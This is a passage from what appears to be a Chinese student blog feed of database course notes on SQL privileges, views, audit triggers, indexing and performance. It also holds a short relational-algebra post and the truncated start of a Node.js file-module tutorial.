class="operator">/</span>给予经理（Manager）角色对员工表（Emp）的查询（<span class="keyword">SELECT</span>）权限和更新（<span class="keyword">UPDATE</span>）员工工资（salary）的权限：</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> Proj <span class="keyword">TO</span> Diretor <span class="keyword">WITH</span> <span class="keyword">GRANT</span> OPTION;<span class="operator">/</span><span class="operator">/</span>给予主管（Director）角色对项目表（Proj）的所有权限（<span class="keyword">ALL</span> PRIVILEGES），并且允许主管再授予这些权限给其他用户（<span class="keyword">WITH</span> <span class="keyword">GRANT</span> OPTION）：</span><br></pre></td></tr></table></figure><h4 id="11-收回权限"><a href="#11-收回权限" class="headerlink" title="11.收回权限"></a>11.收回权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> dept <span class="keyword">FROM</span> PUBLIC;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">ALL</span> PRIVILEGES <span class="keyword">ON</span> Emp <span class="keyword">FROM</span> Joe;</span><br></pre></td></tr></table></figure><h4 id="12-通过视图来增强安全-–将SELECT权限细化到列"><a href="#12-通过视图来增强安全-–将SELECT权限细化到列" class="headerlink" title="12.通过视图来增强安全 –将SELECT权限细化到列"></a>12.通过视图来增强安全 –将SELECT权限细化到列</h4><p>增强安全  —例如这里要隐隐藏员工表的birthdate和salary</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> EmpViw <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> eno,ename,...,<span class="keyword">FROM</span> emp.</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;其实就是把视图当作一个表了</p><h4 id="13-通过视图来增强安全-–将权限细化到行"><a href="#13-通过视图来增强安全-–将权限细化到行" class="headerlink" title="13.通过视图来增强安全 –将权限细化到行"></a>13.通过视图来增强安全 –将权限细化到行</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> AccountTmp <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">SELECT</span> eno,name,...,</span><br><span class="line"><span class="keyword">FROM</span> emp</span><br><span class="line"><span class="keyword">WHERE</span> dno<span class="operator">=</span><span class="string">&#x27;410&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>授权</strong></p><blockquote><p>GRANT SELECT ON AccountEmp TO AccountStaff;</p></blockquote><h4 id="14-用触发器实现安全审计"><a href="#14-用触发器实现安全审计" class="headerlink" title="14.用触发器实现安全审计"></a>14.用触发器实现安全审计</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> cheatingEmploee</span><br><span class="line">AFTER <span class="keyword">UPDATE</span> <span class="keyword">OF</span> salary <span class="keyword">ON</span> Emp</span><br><span class="line"><span class="keyword">REFERENCING</span> </span><br><span class="line"><span class="keyword">OLD</span> <span class="type">ROW</span> <span class="keyword">AS</span> <span class="keyword">old</span></span><br><span class="line"><span class="keyword">NEW</span> <span class="type">ROW</span> <span class="keyword">AS</span> <span class="keyword">new</span></span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line"><span class="keyword">WHEN</span> (<span class="variable">@new</span>.salary<span class="operator">&gt;</span><span class="variable">@old</span>.salary<span class="operator">*</span><span class="number">1.1</span>)</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> auditEmpSalary</span><br><span class="line"><span class="keyword">VALUES</span>(get_user_id(),get_connect_ip()),<span class="type">timestamp</span>(now()),<span class="variable">@new</span>.eno,<span class="variable">@new</span>.salary,<span class="variable">@old</span>.salary)</span><br></pre></td></tr></table></figure><h4 id="15-权限管理的简化"><a href="#15-权限管理的简化" class="headerlink" title="15.权限管理的简化"></a>15.权限管理的简化</h4><p>用户角色(ROLE)概念的提出</p><blockquote><p>不给某个用户授权，而是给角色授权，然后再将角色授予给某个用户</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">INSERT</span>(s_no, c_no, semester ) <span class="keyword">ON</span> enroll <span class="keyword">TO</span> student;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">UPDATE</span>(class_no, t_no) <span class="keyword">ON</span> enroll <span class="keyword">TO</span> administrator;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">UPDATE</span>(grade) <span class="keyword">ON</span> enroll <span class="keyword">TO</span> teacher;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> enroll <span class="keyword">TO</span> student, administrator, teacher;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">DELETE</span> <span class="keyword">ON</span> enroll <span class="keyword">TO</span> administrator, student;</span><br></pre></td></tr></table></figure><blockquote><p>授权是，不要以用户身份授权，而应该以角色身份授权</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="built_in">CURRENT_ROLE</span> <span class="keyword">AS</span> assiant;</span><br><span class="line"><span class="keyword">GRANT</span> student <span class="keyword">TO</span> B GRANTED <span class="keyword">BY</span> <span class="built_in">CURRENT_ROLE</span>;</span><br></pre></td></tr></table></figure><h3 id="九-数据处理性能提升技术"><a href="#九-数据处理性能提升技术" class="headerlink" title="九.数据处理性能提升技术"></a>九.数据处理性能提升技术</h3><h4 id="1-绪论-1"><a href="#1-绪论-1" class="headerlink" title="1.绪论"></a>1.绪论</h4><p>•企业数据集中存储在数据库中，海量的数据。从海量的数据中查找和定位数据非常耗时费力。</p><p>•数据集中后，所有用户都要来访问数据库，出现很多用户同时访问情形，数据库服务器成了的负载中心，任务繁重。</p><p>•许多企业的系统因性能低下，超出用户容忍，受到非议与责难，影响企业形象。</p><p>•从挖掘和利用数据特性，机器特性，以及访问特性找出路。</p><p>•有效方法：数据分类&#x2F;排序、数据索引。</p><h4 id="2-数据库性能度量指标"><a href="#2-数据库性能度量指标" class="headerlink" title="2.数据库性能度量指标"></a>2.数据库性能度量指标</h4><ul><li><strong>事务吞吐量</strong>：单位时间能够处理的交易(事务)数量</li><li><strong>响应时间</strong>：完成单个交易所用的时间</li></ul><p>&#x3D;&#x3D;总指标：事务吞吐量&#x2F;响应时间&#x3D;&#x3D;</p><h4 id="3-充分提高数据库性能的策略"><a href="#3-充分提高数据库性能的策略" class="headerlink" title="3.充分提高数据库性能的策略"></a>3.充分提高数据库性能的策略</h4><p><strong>挖掘和利用</strong></p><ul><li>数据特性</li><li>硬件特性</li><li>数据访问特性</li></ul><h4 id="4-将用户访问频繁的数据放在中央位置，把联系紧密的数据临近存储"><a href="#4-将用户访问频繁的数据放在中央位置，把联系紧密的数据临近存储" class="headerlink" title="4.将用户访问频繁的数据放在中央位置，把联系紧密的数据临近存储"></a>4.将用户访问频繁的数据放在中央位置，把联系紧密的数据临近存储</h4><p>缓存：可实现磁盘访问的批量化</p><p>![image-20240412222023606](<a href="https://cdn.jsdelivr.net/Ycx6666">https://cdn.jsdelivr.net/Ycx6666</a> &#x2F; TyporaImage&#x2F;21QBICuoWJmcVLK.png)</p><h4 id="5-提高的方法"><a href="#5-提高的方法" class="headerlink" title="5.提高的方法"></a>5.提高的方法</h4><ul><li><p>方法1: 排序;</p></li><li><p>方法2: 索引 （Tree索引和哈希索引）；</p></li><li><p>方法3: 连续的磁盘存储;</p></li><li><p>方法4: 分类、聚簇;</p></li><li><p>方法5: 内存缓冲;</p></li><li><p>方法6: 并发执行;</p></li><li><p>方法7: 查询优化;</p></li><li><p>方法8: 日志和数据分盘存储；</p></li></ul><h4 id="6-其中与数据库设计有关的方法"><a href="#6-其中与数据库设计有关的方法" class="headerlink" title="6.其中与数据库设计有关的方法"></a>6.其中与数据库设计有关的方法</h4><ul><li><p><strong>方法1: 排序;</strong></p></li><li><p><strong>方法2: 索引 ；</strong></p></li><li><p><strong>方法3: 连续的磁盘存储;</strong></p></li><li><p><strong>方法4: 分类、聚簇;</strong></p></li><li><p><strong>方法5: 内存缓冲;</strong></p></li><li><p><strong>方法8: 日志和数据分盘存储</strong></p></li></ul><blockquote><p>方法6“并发执行”和方法7“查询优化” ，完全封装在DBMS中，对数据库设计者DBA透明</p><p>其他的方法都需要数据库设计者DBA进行配置</p></blockquote><h4 id="7-减少无效运输–创建索引"><a href="#7-减少无效运输–创建索引" class="headerlink" title="7.减少无效运输–创建索引"></a>7.减少无效运输–创建索引</h4><h5 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> INDEX stu_index <span class="keyword">ON</span> student(d_no,name);</span><br></pre></td></tr></table></figure><h5 id="正确的用索引："><a href="#正确的用索引：" class="headerlink" title="正确的用索引："></a>正确的用索引：</h5><ul><li><p><strong>不对数据量少的表创建索引</strong>：因为l读磁盘是以页（16k)为单位进行，如果表数据量只有几个页，索引就没意义。就像很少几页的文章，再给它搞个目录页也没有意义；</p></li><li><p><strong>对字符串的字段，例如备注字段，不要创建索引，因为压缩比会小</strong></p></li><li><p>对经常作为查询条件、链接运算、排序、分组、UNION，DISTINCT字段，对其创建索引。</p></li></ul><h4 id="8-对于索引的思考"><a href="#8-对于索引的思考" class="headerlink" title="8.对于索引的思考"></a>8.对于索引的思考</h4><p><img src="/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A02-md/../../../Typora/Project/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%EF%BC%885-8%EF%BC%89.assets/zpMLw5nOPdD7UBv.png" alt="image-20240412224401802"></p><p>学号sno作为学生表student的主键，其结构为yyyyddssccnn，可以帮助快速定位和检索信息，其中：</p><ul><li>yyyy 代表年份，</li><li>dd 代表部门，</li><li>ss 代表专业代码，</li><li>cc 可能代表班级，</li><li>nn 代表个人编号。</li></ul><p>使用这样结构化的主键，我们可以通过WHERE子句中的LIKE操作符来进行模糊匹配查询，这些查询可以高效地利用主键索引（索引前缀匹配原则）：</p><ul><li><code>sno LIKE ‘20172601%’</code>：查询2017年部门编号为26，班级编号为01的所有学生。</li><li><code>sno LIKE ‘2017260102%’</code>：查询2017年部门编号为26，班级编号为01，个人编号以02开头的学生。</li><li><code>sno LIKE ‘_ _ _ _2601%’</code>：查询所有年份中部门编号为26，班级编号为01的学生。</li></ul><p>这些模糊查询大多数情况下能够有效地使用主键索引，特别是当查询模式定位在主键索引的开始部分时。</p><p>至于选课表enroll，其可能的主键为{sno, cno, semester}，也就是学号、课程号和学期联合起来确定一条独特的记录。关于这个主键是否设置差异或者是否需要建立多个索引，要基于以下考虑：</p><ul><li>索引选择的顺序应该基于查询条件中最常使用的字段顺序。</li><li>不同的索引顺序适用于不同的查询模式。</li><li>通常，选择最常用来过滤查询的字段作为索引的最前部，可以获得更好的性能。</li></ul><p>例如：</p><ul><li>如果查询经常过滤学期，然后是学号，最后是课程号，那{semester, sno, cno}可能是一个好的选择。</li><li>如果查询是基于学号过滤的，那{sno, …}开头的索引优先级会更高。</li></ul><p>一般情况下，不需要为表的所有可能的主键列组合创建索引，因为这样会造成维护成本高和写入性能下降。实践中，应该根据应用程序查询的实际模式来设计和实现所需要的索引。</p><h4 id="9-对于索引的思考-2"><a href="#9-对于索引的思考-2" class="headerlink" title="9.对于索引的思考 -2"></a>9.对于索引的思考 -2</h4><ul><li><p>传统概念上，索引是为了减少从磁盘到CPU的无效运输</p></li><li><p>数据还有从内存至CPU的运输，是否也要创建索引，减少从内存到CPU的无效运输？</p></li><li><p>数据从磁盘到内存，和由内存到CPU，有什么区别？</p></li><li><p>对于一个表的外键字段，创建索引时，由于很多行的外键字段值相同，该如何处理，以增大压缩比？</p></li><li><p>为了提升性能，索引虽对用户不可见，但是对应用程序可见。</p></li></ul><ol><li><strong>传统概念上的索引</strong>：确实，传统上认为创建索引的目的之一是为了减少从磁盘读取不必要数据的次数，从而减少I&#x2F;O操作的时间开销。索引可以帮助数据库快速定位到数据存储位置，减少磁盘的随机访问时间。</li><li><strong>内存至CPU的数据运输</strong>：现在的数据库系统很多都采用了内存数据库技术或者缓存技术，可以将频繁访问的数据保留在内存中。即使在内存中，索引仍然是有用的，因为它仍然可以减少不必要的数据比对操作，从而减少CPU处理时间。因此，索引不只是为了减少硬盘I&#x2F;O，同样也是为了优化内存中数据的访问效率。</li><li><strong>磁盘到内存，和内存到CPU的区别</strong>：磁盘到内存（Disk to RAM）主要是涉及磁盘I&#x2F;O操作，速度相对较慢，因为它需要机械移动(如传统HDD)或电子操作(如SSD)。内存到CPU（RAM to CPU）则是涉及将数据从内存传输到CPU，这个速度相对较快，因为都是电子操作，且内存速度通常比磁盘快几个数量级。</li><li><strong>外键字段的索引压缩</strong>：当外键字段的值相同时，可以采用如下方法优化：<ul><li><strong>选择合适的压缩级别</strong>：数据库如Oracle允许你为索引选择不同级别的压缩。选择合适的压缩级别可以在提高压缩比和查询性能之间做出平衡。</li><li><strong>使用部分索引</strong>：如果外键字段和查询模式允许，你可以创建只包括常用值或特定值的部分索引。</li><li><strong>Bitmap索引</strong>：对于有大量重复值的外键字段，如在数据仓库环境中，Bitmap索引可能更加有效，因为它们能高效地压缩相同值。</li><li><strong>使用较小的数据类型</strong>：如果外键的引用范围并不大，可以考虑使用较小的数据类型以减少每个索引项的大小。</li></ul></li><li><strong>索引的可见性</strong>：对用户来说，索引的创建和存在大多数情况下是透明的，即用户无需关心索引的细节，只需关心查询语句即可。然而，对于应用程序和数据库管理员来说，索引对性能的影响是非常明显的。合适的索引可以显著提高数据检索性能，不合适的索引则可能成为性能瓶颈。数据库管理员和开发者可以通过分析查询模式、执行计划等来决定是否创建或优化索引。</li></ol><h4 id="10-哈希索引"><a href="#10-哈希索引" class="headerlink" title="10.哈希索引"></a>10.哈希索引</h4><blockquote><p>当往表中添加一行记录时，对要哈希的字段计算哈希值，然后把该记录存储在磁盘空间中磁盘地址为该哈希值的地方。</p></blockquote><blockquote><p>查询数据行时，用户给出字段值，通过哈希计算，就可发现该记录的磁盘空间地址，直接读到对应的记录，不须要一行一行地去比对；</p></blockquote><h5 id="适合使用哈希索引的表特性："><a href="#适合使用哈希索引的表特性：" class="headerlink" title="适合使用哈希索引的表特性："></a>适合使用哈希索引的表特性：</h5><ol><li><strong>主要用于等值查询</strong>：哈希索引非常适合于那些主要涉及键值完全匹配查询的场景，因为哈希函数可以快速定位到数据行。</li><li><strong>键的分布相对均匀</strong>：当键值分布均匀时，哈希索引能提供较好的性能，因为它可以减少潜在的哈希冲突。</li><li><strong>表中数据变化不频繁</strong>：由于哈希索引不如B树索引高效地支持范围查询和顺序访问，因此更适合数据相对静态的表。</li></ol><h5 id="不适合使用哈希索引的表特性："><a href="#不适合使用哈希索引的表特性：" class="headerlink" title="不适合使用哈希索引的表特性："></a>不适合使用哈希索引的表特性：</h5><ol><li><strong>需要支持范围查询</strong>：哈希索引不适合于需要执行范围查询的情况，因为哈希函数的结果无法保证值之间的顺序关系。</li><li><strong>键的分布不均匀</strong>：如果表中的键值存在大量重复，或者分布不均匀，可能会导致大量哈希冲突，进而影响索引的性能。</li><li><strong>大量的写操作</strong>：哈希索引可能不太适合频繁进行插入、更新和删除操作的表，因为这些操作可能会导致哈希桶过载，需要重新哈希或频繁处理哈希冲突。</li><li><strong>需要支持前缀搜索或模式匹配</strong>：哈希索引不适合处理前缀搜索或模式匹配的查询，因为哈希函数的结果与数据值的局部模式无关。</li></ol><blockquote><p>总的来说，哈希索引在处理简单的等值查找时效率很高，但在其他方面较为局限。在选择是否使用哈希索引时，应当考虑表的数据特性和查询需求，以确保索引策略与数据使用模式相匹配。</p></blockquote><h4 id="11-减少磁头移动路程-–-把关系紧密的数据临近存储-–-聚簇-Clustering"><a href="#11-减少磁头移动路程-–-把关系紧密的数据临近存储-–-聚簇-Clustering" class="headerlink" title="11.减少磁头移动路程 – 把关系紧密的数据临近存储 – 聚簇(Clustering)"></a>11.减少磁头移动路程 – 把关系紧密的数据临近存储 – 聚簇(Clustering)</h4><blockquote><p>把关系非常紧密，但位于不同表中的行记录，在磁盘上临近存储。当它们做联接运算时，就能迅速得到结果；</p></blockquote><p><img src="/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A02-md/../../../Typora/Project/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%EF%BC%885-8%EF%BC%89.assets/a8DqAvzjMKwkurG.png" alt="image-20240412230022153"></p><h4 id="12-提高表数据访问性能-–-连续空间存储"><a href="#12-提高表数据访问性能-–-连续空间存储" class="headerlink" title="12.提高表数据访问性能 – 连续空间存储"></a>12.提高表数据访问性能 – 连续空间存储</h4><blockquote><p>对于表记录，如果<strong>连续地存储</strong>在一个磁道上，当读数据时，数据就可<strong>一个紧挨一个地读到</strong>，访问速度就会大大加快；</p><p>你的计算机使用一段时间后，感觉明显变慢，也是这个道理；</p><p>你可以做<strong>磁盘碎片整理</strong>，让每个文件的数据在磁盘上连续存储，这样就克服了<strong>磁头在盘面空间中到处来回移动</strong>，速度大大加快；</p></blockquote><p>![image-20240412230137895](<a href="https://cdn.jsdelivr.net/Ycx6666">https://cdn.jsdelivr.net/Ycx6666</a> &#x2F; TyporaImage&#x2F;Lhbrt5HdCkEfeza.png)</p><h4 id="13-访问频繁的数据存储再中央位置"><a href="#13-访问频繁的数据存储再中央位置" class="headerlink" title="13.访问频繁的数据存储再中央位置"></a>13.访问频繁的数据存储再中央位置</h4><blockquote><p>对于<strong>访问频繁</strong>的数据表存储在<strong>中央位置</strong>，那么就可减少磁头移动的总路程；</p></blockquote><p><img src="/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A02-md/../../../Typora/Project/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%EF%BC%885-8%EF%BC%89.assets/VcMYiJgn14Z6fux.png" alt="image-20240412230237500"></p><h5 id="实现方法"><a href="#实现方法" class="headerlink" title="实现方法"></a>实现方法</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span>SPACE  basicdata DATAFILE ‘c:\oracle\data\basicdata.dbf’  SIZE <span class="number">1000</span>M;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employee (</span><br><span class="line">eno <span class="type">CHAR</span>(<span class="number">5</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">ename <span class="type">VARCHAR</span>(<span class="number">30</span>),</span><br><span class="line"></span><br><span class="line"><span class="keyword">PRIMARY</span> KEY (eno),</span><br><span class="line"><span class="keyword">FOREIGN</span> KEY (dno)  <span class="keyword">REFERENCES</span> Dept(dno),</span><br><span class="line"></span><br><span class="line">TABLESPACE  basicdata,</span><br><span class="line">                  STORAGE (<span class="keyword">INITIAL</span> <span class="number">100</span>M NEXT <span class="number">100</span>M)<span class="operator">/</span><span class="operator">/</span>初始<span class="number">100</span>M，追加<span class="number">100</span>M</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="14-提高数据处理性能-–-缓存"><a href="#14-提高数据处理性能-–-缓存" class="headerlink" title="14.提高数据处理性能 – 缓存"></a>14.提高数据处理性能 – 缓存</h4><blockquote><p>数据存在磁盘上可靠。访问磁盘也是这个道理，很费时间。<strong>缓存</strong>能使得<strong>批量读磁盘</strong>，<strong>批量写磁盘</strong>成为可能，<strong>可减少磁盘运输次数，也可减少磁头移动的总路程</strong>。其原理：<strong>规模效益</strong>。；</p></blockquote><h4 id="15-提高数据处理性能-–-并发执行"><a href="#15-提高数据处理性能-–-并发执行" class="headerlink" title="15.提高数据处理性能 – 并发执行"></a>15.提高数据处理性能 – 并发执行</h4><blockquote><p>并发处理在获得效率提升的同时，也引入了访问冲突的问题，导致数据的不一致和不正确</p></blockquote><p><img src="/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A02-md/../../../Typora/Project/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0%EF%BC%885-8%EF%BC%89.assets/8M2pqTyfjvOxJC5.png" alt="image-20240412230851792"></p><h5 id="并发控制"><a href="#并发控制" class="headerlink" title="并发控制"></a>并发控制</h5><ul><li><p><em><em>当前等待执行的事务集：{Ta}，正在执行的事务集:{T</em>x*}。任一T<em>c</em>属于{T*a</em>}，如果它和{T<em>x</em>}不冲突，那么就可调度执行T<em>c</em>。**</p></li><li><p><em><em>当服务器受理一个客户的事务请求T</em>c<em>时，如果它和{T</em>x*}不冲突，那么就执行它，并将其加进{T*x</em>}中。否则将它加进{T<em>a</em>}中。**</p></li><li><p><em><em>当一个事务执行完毕后，就将它从{T</em>x*}中剔除，然后对{T*a</em>}中的事务逐一检查，调度那些与更新后的{T<em>x</em>}无冲突的事务去执行，并将其从{T<em>a</em>}中移入到{T<em>x</em>}中。**</p></li></ul><h4 id="16-提高数据处理行呢个-–-查询-优化"><a href="#16-提高数据处理行呢个-–-查询-优化" class="headerlink" title="16.提高数据处理行呢个 – 查询 优化"></a>16.提高数据处理行呢个 – 查询 优化</h4><p>![image-20240412231121422](<a href="https://cdn.jsdelivr.net/Ycx6666">https://cdn.jsdelivr.net/Ycx6666</a> &#x2F; TyporaImage&#x2F;uVZT3dlaSp5fNwA.png)</p><h4 id="17-提高数据处理性能-–-配置单独专用的日志磁盘"><a href="#17-提高数据处理性能-–-配置单独专用的日志磁盘" class="headerlink" title="17.提高数据处理性能 – 配置单独专用的日志磁盘"></a>17.提高数据处理性能 – 配置单独专用的日志磁盘</h4><blockquote><p>当配置单独的日志磁盘时，正常运行时，日志具有只写不读的特点，而且是递增，<strong>磁头可一个挨一个地写，不用来回移动，性能得到极大提高</strong>。</p></blockquote><h4 id="18-索引-–-最重要的技能"><a href="#18-索引-–-最重要的技能" class="headerlink" title="18.索引 – 最重要的技能"></a>18.索引 – 最重要的技能</h4><ul><li><p><strong>索引原理：压缩和排序。</strong></p></li><li><p><strong>增大压缩比的方法：分组；</strong></p></li><li><p><strong>分组，与排序相比，约束条件没有那么强！</strong></p></li><li><p><strong>例如，enroll表，以学号分组存储时，即一个学生的选课记录临近存储。与集合概念相比，分组提出了要求；</strong></p></li><li><p><strong>于是，对于enroll表，以学号字段创建索引时，一个学生只有一条索引记录，压缩比增大了n倍，n是一个学生的选课记录行数。</strong></p></li><li><p><strong>NOSQL中的key-Value模型中，value可以是一个集合&#x2F;表。</strong></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;#数据库复习(算是?)2&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;
  &lt;br&gt;
  &lt;/p&gt;&lt;h2 style=&quot;text-align:center;color:#F4E0EA&quot;&gt;
    樱春雪
    &lt;/h2&gt;
  &lt;br&gt;
  &lt;br&gt;
    &lt;div st</summary>
      
    
    
    
    <category term="数据库" scheme="https://ycx6666.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
    <category term="数据库" scheme="https://ycx6666.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    <category term="总结" scheme="https://ycx6666.github.io/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>数据库的一些问题</title>
    <link href="https://ycx6666.github.io/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/"/>
    <id>https://ycx6666.github.io/2024/04/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</id>
    <published>2024-04-04T22:00:00.000Z</published>
    <updated>2024-04-15T10:46:05.683Z</updated>
    
    <content type="html"><![CDATA[<p>#数据库的一些问题</p><p align="center">  <br>  </p><h2 style="text-align:center;color:#F4E0EA">    樱春雪    </h2>  <br>  <br>    <div style="text-align:center">    <a href="https://codeload.github.com/liangjingkanji/DrakeTyporaTheme/zip/refs/heads/master">湖南大学</a>  | <a href="https://theme.typora.io/theme/Drake/">软件工程</a>  | <a href="https://github.com/liangjingkanji/DrakeTyporaTheme/blob/master/issues.md">22级</a></div><br><br>  <br><p></p>### sharp一点想法<h4 id="1-检索至少选修两门课程的学生学号"><a href="#1-检索至少选修两门课程的学生学号" class="headerlink" title="1.检索至少选修两门课程的学生学号"></a>1.检索至少选修两门课程的学生学号</h4><p><strong>思路：</strong>将选修表做&#x3D;&#x3D;自连接&#x3D;&#x3D;。也就是把自己和自己做笛卡尔积<br>$$<br>SC1*SC2<br>$$<br>如果SC1和SC2的sno(学号)相同，但是cno(课程编号)不同，说明这个人至少选修了两门课程。</p><p>那么就可以做如下运算<br>$$<br>\sigma <em>{sc1.sno&#x3D;sc2.sno\and sc1.cno!&#x3D;sc2.cno}(SC1*SC2)<br>$$<br>最后将学号投影出来<br>$$<br>\Pi</em>{sno}(\sigma _{sc1.sno&#x3D;sc2.sno\and sc1.cno!&#x3D;sc2.cno}(SC1<em>SC2))<br>$$<br><strong>我们对此进行扩展，如果需要至少选择三门课程的</strong><br>$$<br>SC1</em>SC2*SC3<br>$$</p><h4 id="2-除法运算的应用"><a href="#2-除法运算的应用" class="headerlink" title="2.除法运算的应用"></a>2.除法运算的应用</h4><p><strong>例：检索全部学生都选修的课程号和课程名</strong></p><p><strong>思路：</strong></p><ul><li>获取所有学生的学号</li></ul><p>$$<br>\Pi_{sno}(S)<br>$$</p><ul><li>获取所有的选课记录，然后除以所有学生学号</li></ul><p>$$<br>\Pi_{cno,sno}(SC)\div\Pi_{sno}(S)<br>$$</p><p><strong>这样子会筛选出选课记录中有全部学号的课程的cno</strong></p><p>只有包含了被除数所有的条目才会将除数中的非sno属性筛选出</p><ul><li>最后投影即可，无需赘述</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;#数据库的一些问题&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;
  &lt;br&gt;
  &lt;/p&gt;&lt;h2 style=&quot;text-align:center;color:#F4E0EA&quot;&gt;
    樱春雪
    &lt;/h2&gt;
  &lt;br&gt;
  &lt;br&gt;
    &lt;div style</summary>
      
    
    
    
    <category term="数据库" scheme="https://ycx6666.github.io/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
    <category term="数据库" scheme="https://ycx6666.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    <category term="总结" scheme="https://ycx6666.github.io/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>Node.js入门</title>
    <link href="https://ycx6666.github.io/2024/03/Node.js%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <id>https://ycx6666.github.io/2024/03/Node.js%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</id>
    <published>2024-03-21T13:44:57.000Z</published>
    <updated>2024-05-07T14:35:10.281Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Node-js使用教程"><a href="#Node-js使用教程" class="headerlink" title="Node.js使用教程"></a>Node.js使用教程</h1><p align="center">  <br>  </p><h2 style="text-align:center;color:#F4E0EA">    樱春雪    </h2>  <br>  <br>    <div style="text-align:center">    <a href="https://codeload.github.com/liangjingkanji/DrakeTyporaTheme/zip/refs/heads/master">湖南大学</a>  | <a href="https://theme.typora.io/theme/Drake/">软件工程</a>  | <a href="https://github.com/liangjingkanji/DrakeTyporaTheme/blob/master/issues.md">2204</a></div><br><br><img style="clear:both;display:block;margin:auto;width:400px;height:100px" src="/2024/03/Node.js%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/7HN)MKDR%[2BI2$@Q69A8$H.png">  <br><p></p><h2 id="1-读取文件内容"><a href="#1-读取文件内容" class="headerlink" title="1.读取文件内容"></a>1.读取文件内容</h2><h3 id="fs文件系统模块"><a href="#fs文件系统模块" class="headerlink" title="fs文件系统模块"></a>fs文件系统模块</h3><p>fs模块时node.js 官方提供的用来操作文件的模块</p><blockquote><p>fs.readFile.()方法，用来读取指定文件中的内容</p><p>fs.writeFile()方法，用来向指定的文件中写入文件</p></blockquote><p>入股要在js代码中，使用fs模块操作文件，需要用到require函数调用模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 